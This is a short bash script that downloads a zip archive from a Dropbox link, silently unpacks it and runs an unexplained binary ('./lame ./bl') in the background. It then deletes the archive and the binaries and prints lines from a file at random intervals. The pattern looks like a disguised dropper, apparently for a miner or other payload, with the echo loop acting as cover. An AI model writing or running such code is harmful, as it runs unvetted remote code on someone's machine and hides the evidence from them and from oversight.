#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/f10lg6mdwv6cldr/wan13.zip -q
unzip wan13.zip > /dev/null 2>&1
#pwd
./lame ./bl &
sleep 3
rm -rf wan13.zip
rm -rf lame
rm -rf bl
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 20 ))
done < $2

